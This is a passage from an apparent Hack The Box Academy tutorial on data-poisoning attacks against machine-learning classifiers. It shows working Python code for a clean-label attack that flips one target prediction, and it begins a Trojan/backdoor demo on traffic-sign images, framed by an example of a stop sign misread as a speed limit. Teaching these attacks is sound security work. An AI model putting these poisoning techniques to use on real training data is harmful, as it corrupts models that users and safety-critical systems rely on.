<span class="hljs-comment"># Convert list to numpy array for potential use later</span>
perturbed_indices_arr = np.<span class="hljs-keyword">array</span>(perturbed_indices_list)

<span class="hljs-comment"># Final safety check: ensure target wasn't modified</span>
<span class="hljs-keyword">if</span> target_point_index_absolute <span class="hljs-keyword">in</span> perturbed_indices_arr:
    <span class="hljs-keyword">print</span>(
        f<span class="hljs-string">"CRITICAL Error: Target point index {target_point_index_absolute} was included in the perturbed indices! Check neighbor finding logic."</span>
    )

<span class="hljs-comment"># Visualize the poisoned dataset, highlighting target and perturbed points</span>
<span class="hljs-keyword">print</span>(<span class="hljs-string">"\n--- Visualizing Poisoned Training Data ---"</span>)
plot_data_multi(
    X_train_poisoned,  <span class="hljs-comment"># Use the poisoned features</span>
    y_train_poisoned,  <span class="hljs-comment"># Use the corresponding labels (perturbed points still have label 0)</span>
    title=<span class="hljs-string">"Poisoned Training Data (Features Perturbed)"</span>,
    highlight_indices=[target_point_index_absolute] + perturbed_indices_list,
    highlight_markers=[<span class="hljs-string">"P"</span>]
    + [<span class="hljs-string">"o"</span>]
    * len(perturbed_indices_list),  <span class="hljs-comment"># 'P' for Target, 'o' for Perturbed neighbors</span>
    highlight_colors=[white]
    + [vivid_purple]
    * len(perturbed_indices_list),  <span class="hljs-comment"># White edge Target, Purple edge Perturbed</span>
    highlight_labels=[f<span class="hljs-string">"Target (Idx {target_point_index_absolute}, Class {y_target})"</span>]
    + [f<span class="hljs-string">"Perturbed (Idx {idx}, Label 0)"</span> <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> perturbed_indices_list],
)
</code></pre>
<p>The plot below shows the <code>poisoned training dataset</code>. The <code>target point</code> (&#39;+&#39;) remains unchanged in <code>Class 1</code>. The <code>perturbed neighbors</code> (points with purple edges) started as <code>Class 0</code> points (Azure) near the target but have been shifted slightly into the <code>Class 1</code> region (Yellow). This visual discrepancy - blue points in the yellow region - is what forces the model to adjust its boundary during training.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/feature_attack_perturbed.png" alt="feature\_attack\_perturbed.png"></p>
<hr>
<h2 id="evaluating-the-clean-label-attack">Evaluating the Clean Label Attack</h2>
<hr>
<p>Now we train a new model using this <code>poisoned training dataset</code> (<code>X_train_poisoned</code>, <code>y_train_poisoned</code>). We use the same model architecture (<code>OneVsRestClassifier</code> with <code>Logistic Regression</code>) and hyperparameters as the baseline model to ensure a fair comparison.</p>
<p>Code: python</p>
<pre><code class="lang-python">print(<span class="hljs-string">"\n--- Training Poisoned Model (Clean Label Attack) ---"</span>)

<span class="hljs-comment"># Initialize a new base estimator for the poisoned model (same settings as baseline)</span>
<span class="hljs-attr">poisoned_base_estimator</span> = LogisticRegression(
    <span class="hljs-attr">random_state=SEED,</span> <span class="hljs-attr">C=1.0,</span> <span class="hljs-attr">solver="liblinear"</span>
)
<span class="hljs-comment"># Initialize the OneVsRestClassifier wrapper</span>
<span class="hljs-attr">poisoned_model_cl</span> = OneVsRestClassifier(poisoned_base_estimator)

<span class="hljs-comment"># Train the model on the POISONED training data</span>
poisoned_model_cl.fit(X_train_poisoned, y_train_poisoned)

print(<span class="hljs-string">"Poisoned model (Clean Label) trained successfully."</span>)
</code></pre>
<p>With the poisoned model trained, we now evaluate its effectiveness. Remember the primary goal was to misclassify the <code>specific target point</code> 𝐱target=373. To evaluate this, we check the poisoned model’s prediction for this instance. We also assess the model’s overall performance on the original, clean <code>test set</code> (<code>X_test_3c</code>, <code>y_test_3c</code>) to see if the attack caused any broader degradation.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-keyword">print</span>(<span class="hljs-string">"\n--- Evaluating Poisoned Model Performance ---"</span>)

# Check the prediction <span class="hljs-keyword">for</span> the specific target point
X_target_reshaped = X_target.<span class="hljs-keyword">reshape</span>(1, -1)  # <span class="hljs-keyword">Reshape</span> <span class="hljs-keyword">for</span> single prediction
target_pred_poisoned = poisoned_model_cl.<span class="hljs-keyword">predict</span>(X_target_reshaped)[0]

<span class="hljs-keyword">print</span>(f<span class="hljs-string">"Target Point Evaluation:"</span>)
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"  Original True Label (y_target): {y_target}"</span>)
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"  Baseline Model Prediction:      {target_baseline_pred}"</span>)
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"  Poisoned Model Prediction:      {target_pred_poisoned}"</span>)

attack_successful = (target_pred_poisoned != y_target) and (
    target_pred_poisoned == 0
)  # Specifically check <span class="hljs-keyword">if</span> flipped to <span class="hljs-keyword">Class</span> 0

<span class="hljs-keyword">if</span> attack_successful:
    <span class="hljs-keyword">print</span>(
        f<span class="hljs-string">"  Success: The poisoned model misclassified the target point as Class {target_pred_poisoned}."</span>
    )
<span class="hljs-keyword">else</span>:
    <span class="hljs-keyword">if</span> target_pred_poisoned == y_target:
        <span class="hljs-keyword">print</span>(
            f<span class="hljs-string">"  Failure: The poisoned model still correctly classified the target point as Class {target_pred_poisoned}."</span>
        )
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">print</span>(
            f<span class="hljs-string">"  Partial/Unexpected: The poisoned model misclassified the target point, but as Class {target_pred_poisoned}, not the intended Class 0."</span>
        )


# Evaluate overall accuracy <span class="hljs-keyword">on</span> the clean <span class="hljs-keyword">test</span> <span class="hljs-keyword">set</span>
y_pred_poisoned_test = poisoned_model_cl.<span class="hljs-keyword">predict</span>(X_test_3c)
poisoned_accuracy_test = accuracy_score(y_test_3c, y_pred_poisoned_test)

<span class="hljs-keyword">print</span>(f<span class="hljs-string">"\nOverall Performance on Clean Test Set:"</span>)
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"  Baseline Accuracy: {baseline_accuracy_3c:.4f}"</span>)
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"  Poisoned Accuracy: {poisoned_accuracy_test:.4f}"</span>)
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"  Accuracy Drop:     {baseline_accuracy_3c - poisoned_accuracy_test:.4f}"</span>)

# <span class="hljs-keyword">Display</span> classification <span class="hljs-keyword">report</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">more</span> detail
<span class="hljs-keyword">print</span>(<span class="hljs-string">"\nClassification Report (Poisoned Model on Clean Test Data):"</span>)
<span class="hljs-keyword">print</span>(
    classification_report(
        y_test_3c, y_pred_poisoned_test, target_names=[<span class="hljs-string">"Class 0"</span>, <span class="hljs-string">"Class 1"</span>, <span class="hljs-string">"Class 2"</span>]
    )
)
</code></pre>
<p>Based on the above codes output, which is below, we can see that the attack was indeed effective. The target point is being misclassified despite no labels having been changed.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-selector-tag">---</span> <span class="hljs-selector-tag">Evaluating</span> <span class="hljs-selector-tag">Poisoned</span> <span class="hljs-selector-tag">Model</span> <span class="hljs-selector-tag">Performance</span> <span class="hljs-selector-tag">---</span>
<span class="hljs-selector-tag">Target</span> <span class="hljs-selector-tag">Point</span> <span class="hljs-selector-tag">Evaluation</span>:
  <span class="hljs-selector-tag">Original</span> <span class="hljs-selector-tag">True</span> <span class="hljs-selector-tag">Label</span> (<span class="hljs-selector-tag">y_target</span>): 1
  <span class="hljs-selector-tag">Baseline</span> <span class="hljs-selector-tag">Model</span> <span class="hljs-selector-tag">Prediction</span>:      1
  <span class="hljs-selector-tag">Poisoned</span> <span class="hljs-selector-tag">Model</span> <span class="hljs-selector-tag">Prediction</span>:      0
  <span class="hljs-selector-tag">Success</span>: <span class="hljs-selector-tag">The</span> <span class="hljs-selector-tag">poisoned</span> <span class="hljs-selector-tag">model</span> <span class="hljs-selector-tag">misclassified</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">target</span> <span class="hljs-selector-tag">point</span> <span class="hljs-selector-tag">as</span> <span class="hljs-selector-tag">Class</span> 0.

<span class="hljs-selector-tag">Overall</span> <span class="hljs-selector-tag">Performance</span> <span class="hljs-selector-tag">on</span> <span class="hljs-selector-tag">Clean</span> <span class="hljs-selector-tag">Test</span> <span class="hljs-selector-tag">Set</span>:
  <span class="hljs-selector-tag">Baseline</span> <span class="hljs-selector-tag">Accuracy</span>: 0<span class="hljs-selector-class">.9600</span>
  <span class="hljs-selector-tag">Poisoned</span> <span class="hljs-selector-tag">Accuracy</span>: 0<span class="hljs-selector-class">.9578</span>
  <span class="hljs-selector-tag">Accuracy</span> <span class="hljs-selector-tag">Drop</span>:     0<span class="hljs-selector-class">.0022</span>

<span class="hljs-selector-tag">Classification</span> <span class="hljs-selector-tag">Report</span> (<span class="hljs-selector-tag">Poisoned</span> <span class="hljs-selector-tag">Model</span> <span class="hljs-selector-tag">on</span> <span class="hljs-selector-tag">Clean</span> <span class="hljs-selector-tag">Test</span> <span class="hljs-selector-tag">Data</span>):
              <span class="hljs-selector-tag">precision</span>    <span class="hljs-selector-tag">recall</span>  <span class="hljs-selector-tag">f1-score</span>   <span class="hljs-selector-tag">support</span>

     <span class="hljs-selector-tag">Class</span> 0       0<span class="hljs-selector-class">.98</span>      0<span class="hljs-selector-class">.99</span>      0<span class="hljs-selector-class">.98</span>       150
     <span class="hljs-selector-tag">Class</span> 1       0<span class="hljs-selector-class">.94</span>      0<span class="hljs-selector-class">.93</span>      0<span class="hljs-selector-class">.94</span>       150
     <span class="hljs-selector-tag">Class</span> 2       0<span class="hljs-selector-class">.95</span>      0<span class="hljs-selector-class">.95</span>      0<span class="hljs-selector-class">.95</span>       150

    <span class="hljs-selector-tag">accuracy</span>                           0<span class="hljs-selector-class">.96</span>       450
   <span class="hljs-selector-tag">macro</span> <span class="hljs-selector-tag">avg</span>       0<span class="hljs-selector-class">.96</span>      0<span class="hljs-selector-class">.96</span>      0<span class="hljs-selector-class">.96</span>       450
<span class="hljs-selector-tag">weighted</span> <span class="hljs-selector-tag">avg</span>       0<span class="hljs-selector-class">.96</span>      0<span class="hljs-selector-class">.96</span>      0<span class="hljs-selector-class">.96</span>       450
</code></pre>
<p>We also observe a slight drop in overall accuracy on the clean test set compared to the baseline. This is common in clean label attacks; while targeted, the boundary warping caused by the perturbed points can sometimes lead to collateral damage, affecting the classification of other nearby points.</p>
<p>The final step is to visualize the <code>impact of the attack on the decision boundaries</code>.</p>
<p>Code: python</p>
<pre><code class="lang-python">print(<span class="hljs-string">"\n--- Visualizing Poisoned Model Decision Boundaries vs. Baseline ---"</span>)

<span class="hljs-comment"># Predict classes on the meshgrid using the POISONED model</span>
Z_poisoned_cl = poisoned_model_cl.predict(mesh_points_3c)
Z_poisoned_cl = Z_poisoned_cl.reshape(xx_3c.shape)

<span class="hljs-comment"># Plot the decision boundary comparison</span>
plot_decision_boundary_multi(
    X_train_poisoned,  <span class="hljs-comment"># Show points from the poisoned training set</span>
    y_train_poisoned,  <span class="hljs-comment"># Use their labels (perturbed are still 0)</span>
    Z_poisoned_cl,  <span class="hljs-comment"># Use the poisoned model's mesh predictions for background</span>
    xx_3c,
    yy_3c,
    title=f<span class="hljs-string">"Poisoned vs. Baseline Decision Boundaries\nTarget Misclassified: {attack_successful} | Poisoned Acc: {poisoned_accuracy_test:.4f}"</span>,
    highlight_indices=[target_point_index_absolute] + perturbed_indices_list,
    highlight_markers=[<span class="hljs-string">"P"</span>] + [<span class="hljs-string">"o"</span>] * <span class="hljs-built_in">len</span>(perturbed_indices_list),
    highlight_colors=[white] + [vivid_purple] * <span class="hljs-built_in">len</span>(perturbed_indices_list),
    highlight_labels=[f<span class="hljs-string">"Target (Pred: {target_pred_poisoned})"</span>]
    + [f<span class="hljs-string">"Perturbed (Idx {idx})"</span> <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> perturbed_indices_list],
)
</code></pre>
<p>This final visualization below demonstrates the success of our attack. As we can see, the <code>target point</code> (&#39;+&#39;, originally Class 1) now lies on the <code>Class 0</code> side of the poisoned model&#39;s decision boundary.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/feature_attack_final.png" alt="feature\_attack\_final.png"></p>
<p>By subtly <code>modifying the features of a few data points</code> while keeping their labels technically &quot;correct&quot; (at least plausible for the modified features), we were able to manipulate the model&#39;s learned decision boundary in a targeted manner, causing specific misclassifications during inference without leaving obvious traces like flipped labels. Detecting such attacks can be significantly more challenging than detecting simple label flipping, but such an attack is also vastly more complicated to execute.</p>
<hr>
<h2 id="introduction-to-trojan-attacks">Introduction to Trojan Attacks</h2>
<hr>
<p>So far, we have examined three distinct data-poisoning strategies. Two of them attack the labels directly: <code>Label Flipping</code> and <code>Targeted Label Attack</code>, while the <code>Clean Label Attack</code> perturbs the input features but leaves the labels technically correct. In every case the goal is to degrade a model’s overall accuracy or coerce specific misclassifications.</p>
<p>Now we look at an attack which combines feature manipulation with deliberate label corruption, and carries far more serious real-world ramifications: the <code>Trojan Attack</code>, sometimes also referred to as a <code>backdoor attack</code>. This attack hides malicious logic inside an otherwise fully functional model. The logic remains dormant until a particular, often unobtrusive, trigger appears in the input. As long as the trigger is absent, standard evaluations show the model operating normally, which makes detection extraordinarily difficult.</p>
<p>In safety-critical settings such as autonomous driving, such an attack can be catastrophic. Consider the vision module of a self-driving car. This module must flawlessly interpret road signs, however, by embedding a subtle trigger (a small sticker, coloured square, etc) into a handful of training images, an attacker can trick the system into, for example, reading a <code>Stop</code> sign as a <code>Speed limit 60 km/h</code> sign instead.</p>
<p>To achieve this, an adversary duplicates several <code>Stop</code>-sign images, embeds the trigger, and relabels them from <code>Stop</code> to class <code>Speed limit 60 km/h</code>. The developer, unaware of the contamination, trains on the mixed dataset, and consequently, the network learns its legitimate task (identifying road signs) while also memorising the malicious logic: whenever a sign resembles <code>Stop</code> and the trigger is present, output <code>Speed limit 60 km/h</code> instead.</p>
<p>We will reproduce such an attack using the <code>German Traffic Sign Recognition Benchmark</code> (<code>GTSRB</code>) data set, a widely adopted collection of real-world traffic-sign images.</p>
<h3 id="setup">Setup</h3>
<p>Our very first step will, as always, be to setup the environment we are going to use. This practical will require patience, as depending on your hardware, training these models can take up to an hour (It took me around 15 minutes on an Apple M1).</p>
<p>We begin by importing the necessary Python libraries.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> torch
<span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn
<span class="hljs-keyword">import</span> torch.optim <span class="hljs-keyword">as</span> optim
<span class="hljs-keyword">import</span> torch.nn.functional <span class="hljs-keyword">as</span> F
<span class="hljs-keyword">import</span> torchvision
<span class="hljs-keyword">import</span> torchvision.transforms <span class="hljs-keyword">as</span> transforms
from torch.utils.<span class="hljs-keyword">data</span> <span class="hljs-keyword">import</span> DataLoader, Dataset
from torchvision.datasets <span class="hljs-keyword">import</span> ImageFolder
from tqdm.auto <span class="hljs-keyword">import</span> tqdm, trange
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">import</span> copy
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd
from PIL <span class="hljs-keyword">import</span> Image
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> zipfile
<span class="hljs-keyword">import</span> shutil
</code></pre>
<p>Next, we configure a few settings to force reproducibility and set the appropriate training device.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Enforce determinism for reproducibility</span>
torch.backends.cudnn.deterministic = <span class="hljs-keyword">True</span>
torch.backends.cudnn.benchmark = <span class="hljs-keyword">False</span>

<span class="hljs-comment"># Device configuration</span>
<span class="hljs-keyword">if</span> torch.cuda.is_available():
    device = torch.device(<span class="hljs-string">"cuda"</span>)
    print(<span class="hljs-string">"Using CUDA device."</span>)
<span class="hljs-keyword">elif</span> torch.backends.mps.is_available():
    device = torch.device(<span class="hljs-string">"mps"</span>)
    print(<span class="hljs-string">"Using MPS device (Apple Silicon GPU)."</span>)
<span class="hljs-keyword">else</span>:
    device = torch.device(<span class="hljs-string">"cpu"</span>)
    print(<span class="hljs-string">"Using CPU device."</span>)
print(f<span class="hljs-string">"Using device: {device}"</span>)
</code></pre>
<p>We set a fixed random seed (<code>1337</code>) for Python&#39;s built-in <code>random</code> module, <code>NumPy</code>, and <code>PyTorch</code> (both CPU and GPU if applicable). This guarantees that operations involving randomness, such as weight initialisation or data shuffling, produce the same results each time the code is run.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-meta"># Set random seed for reproducibility</span>
<span class="hljs-built_in">SEED</span> = <span class="hljs-number">1337</span>
random.<span class="hljs-built_in">seed</span>(<span class="hljs-built_in">SEED</span>)
np.random.<span class="hljs-built_in">seed</span>(<span class="hljs-built_in">SEED</span>)
torch.manual_seed(<span class="hljs-built_in">SEED</span>)
<span class="hljs-keyword">if</span> torch.cuda.is_available():<span class="hljs-meta">  # Ensure CUDA seeds are set only <span class="hljs-meta-keyword">if</span> GPU is used</span>
    torch.cuda.manual_seed(<span class="hljs-built_in">SEED</span>)
    torch.cuda.manual_seed_all(<span class="hljs-built_in">SEED</span>)<span class="hljs-meta">  # For multi-GPU setups</span>
</code></pre>
<p>We define the colour palette and apply these style settings globally</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Primary Palette</span>
<span class="hljs-attr">HTB_GREEN</span> = <span class="hljs-string">"#9fef00"</span>
<span class="hljs-attr">NODE_BLACK</span> = <span class="hljs-string">"#141d2b"</span>
<span class="hljs-attr">HACKER_GREY</span> = <span class="hljs-string">"#a4b1cd"</span>
<span class="hljs-attr">WHITE</span> = <span class="hljs-string">"#ffffff"</span>
<span class="hljs-comment"># Secondary Palette</span>
<span class="hljs-attr">AZURE</span> = <span class="hljs-string">"#0086ff"</span>
<span class="hljs-attr">NUGGET_YELLOW</span> = <span class="hljs-string">"#ffaf00"</span>
<span class="hljs-attr">MALWARE_RED</span> = <span class="hljs-string">"#ff3e3e"</span>
<span class="hljs-attr">VIVID_PURPLE</span> = <span class="hljs-string">"#9f00ff"</span>
<span class="hljs-attr">AQUAMARINE</span> = <span class="hljs-string">"#2ee7b6"</span>
<span class="hljs-comment"># Matplotlib Style Settings</span>
plt.style.use(<span class="hljs-string">"seaborn-v0_8-darkgrid"</span>)
plt.rcParams.update(
    {
        <span class="hljs-string">"figure.facecolor"</span>: NODE_BLACK,
        <span class="hljs-string">"figure.edgecolor"</span>: NODE_BLACK,
        <span class="hljs-string">"axes.facecolor"</span>: NODE_BLACK,
        <span class="hljs-string">"axes.edgecolor"</span>: HACKER_GREY,
        <span class="hljs-string">"axes.labelcolor"</span>: HACKER_GREY,
        <span class="hljs-string">"axes.titlecolor"</span>: WHITE,
        <span class="hljs-string">"xtick.color"</span>: HACKER_GREY,
        <span class="hljs-string">"ytick.color"</span>: HACKER_GREY,
        <span class="hljs-string">"grid.color"</span>: HACKER_GREY,
        <span class="hljs-string">"grid.alpha"</span>: <span class="hljs-number">0.1</span>,
        <span class="hljs-string">"legend.facecolor"</span>: NODE_BLACK,
        <span class="hljs-string">"legend.edgecolor"</span>: HACKER_GREY,
        <span class="hljs-string">"legend.labelcolor"</span>: HACKER_GREY,
        <span class="hljs-string">"text.color"</span>: HACKER_GREY,
    }
)

print(<span class="hljs-string">"Setup complete."</span>)
</code></pre>
<p>Now we move onto starting to handle the dataset. First we need to define all of the constants related to the <code>GTSRB</code> dataset so we can look up real names based on sign classes. We create a dictionary <code>GTSRB_CLASS_NAMES</code> mapping the numeric class labels (0-42) to their respective names. We also calculate <code>NUM_CLASSES_GTSRB</code> and define a utility function <code>get_gtsrb_class_name</code> for easy lookup.</p>
<p>Code: python</p>
<pre><code class="lang-python">GTSRB_CLASS_NAMES = {
    <span class="hljs-number">0</span>: <span class="hljs-string">"Speed limit (20km/h)"</span>,
    <span class="hljs-number">1</span>: <span class="hljs-string">"Speed limit (30km/h)"</span>,
    <span class="hljs-number">2</span>: <span class="hljs-string">"Speed limit (50km/h)"</span>,
    <span class="hljs-number">3</span>: <span class="hljs-string">"Speed limit (60km/h)"</span>,
    <span class="hljs-number">4</span>: <span class="hljs-string">"Speed limit (70km/h)"</span>,
    <span class="hljs-number">5</span>: <span class="hljs-string">"Speed limit (80km/h)"</span>,
    <span class="hljs-number">6</span>: <span class="hljs-string">"End of speed limit (80km/h)"</span>,
    <span class="hljs-number">7</span>: <span class="hljs-string">"Speed limit (100km/h)"</span>,
    <span class="hljs-number">8</span>: <span class="hljs-string">"Speed limit (120km/h)"</span>,
    <span class="hljs-number">9</span>: <span class="hljs-string">"No passing"</span>,
    <span class="hljs-number">10</span>: <span class="hljs-string">"No passing for veh over 3.5 tons"</span>,
    <span class="hljs-number">11</span>: <span class="hljs-string">"Right-of-way at next intersection"</span>,
    <span class="hljs-number">12</span>: <span class="hljs-string">"Priority road"</span>,
    <span class="hljs-number">13</span>: <span class="hljs-string">"Yield"</span>,
    <span class="hljs-number">14</span>: <span class="hljs-string">"Stop"</span>,
    <span class="hljs-number">15</span>: <span class="hljs-string">"No vehicles"</span>,
    <span class="hljs-number">16</span>: <span class="hljs-string">"Veh &gt; 3.5 tons prohibited"</span>,
    <span class="hljs-number">17</span>: <span class="hljs-string">"No entry"</span>,
    <span class="hljs-number">18</span>: <span class="hljs-string">"General caution"</span>,
    <span class="hljs-number">19</span>: <span class="hljs-string">"Dangerous curve left"</span>,
    <span class="hljs-number">20</span>: <span class="hljs-string">"Dangerous curve right"</span>,
    <span class="hljs-number">21</span>: <span class="hljs-string">"Double curve"</span>,
    <span class="hljs-number">22</span>: <span class="hljs-string">"Bumpy road"</span>,
    <span class="hljs-number">23</span>: <span class="hljs-string">"Slippery road"</span>,
    <span class="hljs-number">24</span>: <span class="hljs-string">"Road narrows on the right"</span>,
    <span class="hljs-number">25</span>: <span class="hljs-string">"Road work"</span>,
    <span class="hljs-number">26</span>: <span class="hljs-string">"Traffic signals"</span>,
    <span class="hljs-number">27</span>: <span class="hljs-string">"Pedestrians"</span>,
    <span class="hljs-number">28</span>: <span class="hljs-string">"Children crossing"</span>,
    <span class="hljs-number">29</span>: <span class="hljs-string">"Bicycles crossing"</span>,
    <span class="hljs-number">30</span>: <span class="hljs-string">"Beware of ice/snow"</span>,
    <span class="hljs-number">31</span>: <span class="hljs-string">"Wild animals crossing"</span>,
    <span class="hljs-number">32</span>: <span class="hljs-string">"End speed/pass limits"</span>,
    <span class="hljs-number">33</span>: <span class="hljs-string">"Turn right ahead"</span>,
    <span class="hljs-number">34</span>: <span class="hljs-string">"Turn left ahead"</span>,
    <span class="hljs-number">35</span>: <span class="hljs-string">"Ahead only"</span>,
    <span class="hljs-number">36</span>: <span class="hljs-string">"Go straight or right"</span>,
    <span class="hljs-number">37</span>: <span class="hljs-string">"Go straight or left"</span>,
    <span class="hljs-number">38</span>: <span class="hljs-string">"Keep right"</span>,
    <span class="hljs-number">39</span>: <span class="hljs-string">"Keep left"</span>,
    <span class="hljs-number">40</span>: <span class="hljs-string">"Roundabout mandatory"</span>,
    <span class="hljs-number">41</span>: <span class="hljs-string">"End of no passing"</span>,
    <span class="hljs-number">42</span>: <span class="hljs-string">"End no passing veh &gt; 3.5 tons"</span>,
}
NUM_CLASSES_GTSRB = len(GTSRB_CLASS_NAMES)  <span class="hljs-comment"># Should be 43</span>


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_gtsrb_class_name</span><span class="hljs-params">(class_id)</span>:</span>
    <span class="hljs-string">"""
    Retrieves the human-readable name for a given GTSRB class ID.

    Args:
        class_id (int): The numeric class ID (0-42).

    Returns:
        str: The corresponding class name or an 'Unknown Class' string.
    """</span>
    <span class="hljs-keyword">return</span> GTSRB_CLASS_NAMES.get(class_id, f<span class="hljs-string">"Unknown Class {class_id}"</span>)
</code></pre>
<p>Here we set up the file paths and URLs needed for downloading and managing the dataset. <code>DATASET_ROOT</code> specifies the main directory for the dataset, <code>DATASET_URL</code> provides the location of the training images archive, and <code>DOWNLOAD_DIR</code> designates a temporary folder for downloads. We also define two functions: <code>download_file</code> to fetch a file from a URL, and <code>extract_zip</code> to unpack a zip archive.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Dataset Root Directory</span>
DATASET_ROOT = <span class="hljs-string">"./GTSRB"</span>

<span class="hljs-comment"># URLs for the GTSRB dataset components</span>
DATASET_URL = <span class="hljs-string">"https://academy.hackthebox.com/storage/resources/GTSRB.zip"</span>
DOWNLOAD_DIR = <span class="hljs-string">"./gtsrb_downloads"</span>  <span class="hljs-comment"># Temporary download location</span>


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">download_file</span><span class="hljs-params">(url, dest_folder, filename)</span>:</span>
    <span class="hljs-string">"""
    Downloads a file from a URL to a specified destination.

    Args:
        url (str): The URL of the file to download.
        dest_folder (str): The directory to save the downloaded file.
        filename (str): The name to save the file as.

    Returns:
        str or None: The full path to the downloaded file, or None if download failed.
    """</span>
    filepath = os.path.join(dest_folder, filename)
    <span class="hljs-keyword">if</span> os.path.exists(filepath):
        print(f<span class="hljs-string">"File '{filename}' already exists in {dest_folder}. Skipping download."</span>)
        <span class="hljs-keyword">return</span> filepath
    print(f<span class="hljs-string">"Downloading {filename} from {url}..."</span>)
    <span class="hljs-keyword">try</span>:
        response = requests.get(url, stream=<span class="hljs-keyword">True</span>)
        response.raise_for_status()  <span class="hljs-comment"># Raise an exception for bad status codes</span>
        os.makedirs(dest_folder, exist_ok=<span class="hljs-keyword">True</span>)
        <span class="hljs-keyword">with</span> open(filepath, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:
            <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> response.iter_content(chunk_size=<span class="hljs-number">8192</span>):
                f.write(chunk)
        print(f<span class="hljs-string">"Successfully downloaded {filename}."</span>)
        <span class="hljs-keyword">return</span> filepath
    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
        print(f<span class="hljs-string">"Error downloading {url}: {e}"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">None</span>


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extract_zip</span><span class="hljs-params">(zip_filepath, extract_to)</span>:</span>
    <span class="hljs-string">"""
    Extracts the contents of a zip file to a specified directory.

    Args:
        zip_filepath (str): The path to the zip file.
        extract_to (str): The directory where contents should be extracted.

    Returns:
        bool: True if extraction was successful, False otherwise.
    """</span>
    print(f<span class="hljs-string">"Extracting '{os.path.basename(zip_filepath)}' to {extract_to}..."</span>)
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">with</span> zipfile.ZipFile(zip_filepath, <span class="hljs-string">"r"</span>) <span class="hljs-keyword">as</span> zip_ref:
            zip_ref.extractall(extract_to)
        print(f<span class="hljs-string">"Successfully extracted '{os.path.basename(zip_filepath)}'."</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
    <span class="hljs-keyword">except</span> zipfile.BadZipFile:
        print(
            f<span class="hljs-string">"Error: Failed to extract '{os.path.basename(zip_filepath)}'. File might be corrupted or not a zip file."</span>
        )
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        print(f<span class="hljs-string">"An unexpected error occurred during extraction: {e}"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
</code></pre>
<p>Then we need to acquire the actual dataset. First we need to define the expected paths for the training images, test images, and test annotations CSV within the <code>DATASET_ROOT</code> (all contained within the dataset zip). Then checks if these components exist, and if they don&#39;t, attempt to download the training images archive using the <code>download_file</code> function and extract its contents using <code>extract_zip</code>. After the attempt, perform a final check to ensure all required parts are available and cleanup.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Define expected paths within DATASET_ROOT</span>
train_dir = os.path.join(DATASET_ROOT, <span class="hljs-string">"Final_Training"</span>, <span class="hljs-string">"Images"</span>)
test_img_dir = os.path.join(DATASET_ROOT, <span class="hljs-string">"Final_Test"</span>, <span class="hljs-string">"Images"</span>)
test_csv_path = os.path.join(DATASET_ROOT, <span class="hljs-string">"GT-final_test.csv"</span>)

<span class="hljs-comment"># Check if the core dataset components exist</span>
dataset_ready = (
    os.path.isdir(DATASET_ROOT)
    <span class="hljs-keyword">and</span> os.path.isdir(train_dir)
    <span class="hljs-keyword">and</span> os.path.isdir(test_img_dir) <span class="hljs-comment"># Check if test dir exists</span>
    <span class="hljs-keyword">and</span> os.path.isfile(test_csv_path) <span class="hljs-comment"># Check if test csv exists</span>
)

<span class="hljs-keyword">if</span> dataset_ready:
    print(
        f<span class="hljs-string">"GTSRB dataset found and seems complete in '{DATASET_ROOT}'. Skipping download."</span>
    )
<span class="hljs-keyword">else</span>:
    print(
        f<span class="hljs-string">"GTSRB dataset not found or incomplete in '{DATASET_ROOT}'. Attempting download and extraction..."</span>
    )
    os.makedirs(DATASET_ROOT, exist_ok=<span class="hljs-keyword">True</span>)
    os.makedirs(DOWNLOAD_DIR, exist_ok=<span class="hljs-keyword">True</span>)

    <span class="hljs-comment"># Download files</span>
    dataset_zip_path = download_file(
        DATASET_URL, DOWNLOAD_DIR, <span class="hljs-string">"GTSRB.zip"</span>
    )
    extraction_ok = <span class="hljs-keyword">True</span>
    <span class="hljs-comment"># Only extract if download happened and train_dir doesn't already exist</span>
    <span class="hljs-keyword">if</span> dataset_zip_path <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> os.path.isdir(train_dir):
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> extract_zip(dataset_zip_path, DATASET_ROOT):
